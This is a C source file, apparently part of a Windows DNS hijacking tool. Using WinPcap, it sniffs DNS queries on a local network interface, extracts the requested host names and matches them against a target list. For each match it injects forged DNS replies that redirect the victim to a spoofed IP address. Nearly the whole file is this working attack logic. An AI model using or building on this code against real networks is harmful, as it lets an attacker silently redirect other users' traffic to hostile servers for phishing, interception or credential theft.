#define HAVE_REMOTE

#include <pcap.h>
#include <windows.h>
#include <Shlwapi.h>
#include "DNSHijack.h"
#include "GeneralFuncs.h"
#include "DNSSniffer.h"
#include "NetProtocols.h"
#include "PacketCrafter.h"
#include "LinkedListHosts.h"


extern PHOSTNODE gHostsList;





void DNSSniffer(char *pIFCName)
{
  DWORD lRetVal = 0;
  pcap_if_t *lAllDevs = NULL;
  pcap_if_t *lDevice = NULL;
  char lTemp[PCAP_ERRBUF_SIZE];
  char lFilter[MAX_BUF_SIZE + 1];
  struct bpf_program lFCode;
  char lAdapter[MAX_BUF_SIZE + 1];
  int lCounter = 0;
  int lIFCnum = 0;
  unsigned int lNetMask = 0;
  pcap_t *lIFCHandle = NULL;
  char lLocalIP[MAX_BUF_SIZE + 1];


  /*
   * Open device list.
   */
  if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &lAllDevs, lTemp) == -1)
  {
    LogMsg(DBG_ERROR, "DNSSniffer() : Error in pcap_findalldevs_ex() : %s", lTemp);
    lRetVal = 1;
    goto END;
  }

  ZeroMemory(lAdapter, sizeof(lAdapter));
  lCounter = 0;
 
  for(lCounter = 0, lDevice = lAllDevs; lDevice; lDevice = lDevice->next, lCounter++)
  {
    if (StrStrI(lDevice->name, pIFCName))
    {
      strcpy(lAdapter, lDevice->name);
//printf("IP address : %s\n", inet_ntoa(((struct sockaddr_in *)lDevice->addresses->addr)->sin_addr));
//printf("IP address : %s\n", inet_ntoa(((struct sockaddr_in*)lDevice->addresses->addr)->sin_addr));
      break;
    } // if (StrSt...
  } // for(lCoun...
 
   // We dont need this list anymore.
  pcap_freealldevs(lAllDevs);


  /*
   * Open interface.
   *
   */
  if ((lIFCHandle = pcap_open(lAdapter, 65536, PCAP_OPENFLAG_NOCAPTURE_LOCAL, PCAP_READTIMEOUT, NULL, lTemp)) == NULL)
  {
    LogMsg(DBG_ERROR, "DNSSniffer() : Unable to open the adapter");
    lRetVal = 5;
	goto END;
  }
 
  /* 
   * Compiling + setting the filter
   */
  if (lDevice->addresses != NULL)
    lNetMask = ((struct sockaddr_in *)(lDevice->addresses->netmask))->sin_addr.S_un.S_addr;
  else
    lNetMask = 0xffffff; 
 

  ZeroMemory(lFilter, sizeof(lFilter));
  ZeroMemory(&lFCode, sizeof(lFCode));
  ZeroMemory(lLocalIP, sizeof(lLocalIP));

  GetIPFromIFC(pIFCName, lLocalIP, sizeof(lLocalIP)-1);
  snprintf(lFilter, sizeof(lFilter)-1, "udp and dst port 53 and not src host %s", lLocalIP);





  if (pcap_compile((pcap_t *) lIFCHandle, &lFCode, lFilter, 1, lNetMask) < 0)
  {
    printf("Unable to compile the packet filter.\n");
    lRetVal = 3;
   	goto END;
  }

  if (pcap_setfilter((pcap_t *) lIFCHandle, &lFCode) < 0)
  {
    printf("Error setting the filter.\n");
    lRetVal = 4;
	   goto END;
  }





 
  LogMsg(DBG_INFO, "DNSSniffer() : Listener started. Waiting for replies ...");
  // Start intercepting data packets.
  pcap_loop(lIFCHandle, 0, DNSSniffer_Handler, (unsigned char *) lIFCHandle);

END:
 
  /*
   * Release all allocated resources.
   *
   */
  if (lAllDevs)
    pcap_freealldevs(lAllDevs);
 
  LogMsg(DBG_ERROR, "CaptureIncomingPackets() : Exit");
}




/*
 *
 *
 */
void DNSSniffer_Handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data)
{
  pcap_t *lIFCHandle = (pcap_t*) param;
  PETHDR lEthrHdr = (PETHDR) pkt_data;
  PIPHDR lIPHdr = NULL;
  PUDPHDR lUDPHdr = NULL;
  unsigned char lSMAC[MAX_BUF_SIZE + 1];
  unsigned char lDMAC[MAX_BUF_SIZE + 1];
  unsigned char lSIP[MAX_BUF_SIZE + 1];
  unsigned char lDIP[MAX_BUF_SIZE + 1];
  int lIPHdrLen = 0;
  int lSPort = 0;
  int lDPort = 0;
  PHOSTNODE lTmpNode = NULL;
  PDNSHDR lDNSHdr = NULL;           /* dns header */
  char *data = NULL;            /* we modify data so keep orig */  
  int lDataLen = 0;
  int lCount1 = 0;
  int lCount2 = 0;
  int lPktLen = header->len;
  char lHostName[MAX_BUF_SIZE + 1];
  char lTimestamp[MAX_BUF_SIZE + 1];
  SYSTEMTIME lSysTime;



  ZeroMemory(lDMAC, sizeof(lDMAC));
  ZeroMemory(lSMAC, sizeof(lSMAC));
  ZeroMemory(lDIP, sizeof(lDIP));
  ZeroMemory(lSIP, sizeof(lSIP)); 
  ZeroMemory(lHostName, sizeof(lHostName));

  /*
   * Packet is an IP packet.
   */
  if (htons(lEthrHdr->ether_type) == ETHERTYPE_IP)
  { 	  
    lIPHdr = (PIPHDR) (pkt_data + 14);
    lIPHdrLen = (lIPHdr->ver_ihl & 0xf) * 4;

    MAC2String(lEthrHdr->ether_dhost, (unsigned char *) lDMAC, sizeof(lDMAC));
    MAC2String(lEthrHdr->ether_shost, (unsigned char *) lSMAC, sizeof(lSMAC));
    IP2String((unsigned char *) &lIPHdr->daddr, (unsigned char *) lDIP, sizeof(lDIP)-1);
    IP2String( (unsigned char *) &lIPHdr->saddr, (unsigned char *) lSIP, sizeof(lSIP));

   	if (lIPHdr->proto == IP_PROTO_UDP)
	   {
      lUDPHdr =  (PUDPHDR) ((unsigned char*) lIPHdr + lIPHdrLen);
      lSPort = ntohs(lUDPHdr->sport);
	     lDPort = ntohs(lUDPHdr->dport);

      if (lDPort == 53)
   	  {
        lDNSHdr = (PDNSHDR) ((unsigned char*) lUDPHdr + sizeof(UDPHDR));
        data = (char *) ((unsigned char*) lDNSHdr + sizeof(DNSHDR));
/*
        printf("%s/%s:%d -> %s/%s:%d\n", lSMAC, lSIP, lSPort, lDMAC, lDIP, lDPort);
        printf("Transaction ID : 0x%08x\n", ntohs(lDNSHdr->id));
        printf("QuestionCount : %d/%d\n", lDNSHdr->q_count, ntohs(lDNSHdr->q_count));
        printf("Answers %d/%d\n", lDNSHdr->ans_count, ntohs(lDNSHdr->ans_count));
*/

        /*
         * Extract host name
         */
        if ((lDataLen = lPktLen - (sizeof(ETHDR) + lIPHdrLen + sizeof(UDPHDR) + sizeof(PDNSHDR))) > 0)
        {
          lCount2 = 0;
          for (lCount1 = 1; lCount1 < lDataLen && lCount2 < sizeof(lHostName); lCount1++)
          {
            if (data[lCount1] > 31 && data[lCount1] < 127)
              lHostName[lCount2++] = data[lCount1];
            else if (data[lCount1] == '\0')
              break;
            else
            {
              lHostName[lCount2++] = '.';
            } // if (data[lCou...
          } // for (j = 0; j...
        } // if (lDa...

      		// Creating time stamp
      		GetSystemTime(&lSysTime);
        snprintf(lTimestamp, sizeof(lTimestamp)-1, "%02d:%02d:%02d.%.3d", lSysTime.wHour, lSysTime.wMinute, lSysTime.wSecond, lSysTime.wMilliseconds);




       	// Give user feedback what's happening.
      		if ((lTmpNode = GetNodeByHostname(gHostsList, (unsigned char *) lHostName)) != NULL)
      		{
          printf("[%s] Request from %s to DNS server %s\n  Redirecting %s to %s\n", lTimestamp, lSIP, lDIP, lTmpNode->sData.HostName, lTmpNode->sData.SpoofedIP);
          InjectDNSPacket((u_char *) pkt_data, lIFCHandle, (char *) lTmpNode->sData.SpoofedIP, (char *) lSIP, (char *) lDIP);
      		}
		      else
          printf("[%s] Request from %s to DNS server %s\n  No entry found for host %s\n", lTimestamp, lSIP, lDIP, lHostName);

      		printf("\n");
  	   }
   	}
  }
}



